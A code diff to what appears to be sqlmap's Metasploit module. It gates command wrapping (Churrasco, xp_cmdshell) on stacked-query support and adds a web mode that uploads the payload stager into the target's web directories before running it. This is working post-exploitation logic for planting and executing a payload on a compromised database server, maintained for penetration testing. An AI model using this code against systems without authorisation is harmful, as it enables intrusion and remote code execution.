@@ -425,10 +425,10 @@ class Metasploit:
 
         cmd = "%s &" % self.exeFilePathRemote
 
-        if self.cmdFromChurrasco:
+        if self.cmdFromChurrasco and kb.stackedTest:
             cmd = "%s \"%s\"" % (self.churrascoPath, cmd)
 
-        if kb.dbms == "Microsoft SQL Server":
+        if kb.dbms == "Microsoft SQL Server" and kb.stackedTest:
             cmd = self.xpCmdshellForgeCmd(cmd)
 
         self.execCmd(cmd, silent=True)
@@ -634,11 +634,19 @@ class Metasploit:
             errMsg = "failed to create the payload stager (%s)" % payloadStderr
             raise sqlmapFilePathException, errMsg
 
-    def uploadMsfPayloadStager(self):
-        self.exeFilePathRemote = "%s/%s" % (conf.tmpPath, os.path.basename(self.exeFilePathLocal))
+    def uploadMsfPayloadStager(self, web=False):
+        if web:
+            self.exeFilePathRemote = "./%s" % os.path.basename(self.exeFilePathLocal)
+        else:
+            self.exeFilePathRemote = "%s/%s" % (conf.tmpPath, os.path.basename(self.exeFilePathLocal))
 
         logger.info("uploading payload stager to '%s'" % self.exeFilePathRemote)
-        self.writeFile(self.exeFilePathLocal, self.exeFilePathRemote, "binary", False)
+
+        if web:
+            for directory in self.webDirectories:
+                self.webFileUpload(self.exeFilePathLocal, self.exeFilePathRemote, directory)
+        else:
+            self.writeFile(self.exeFilePathLocal, self.exeFilePathRemote, "binary", False)
 
         os.unlink(self.exeFilePathLocal)
 
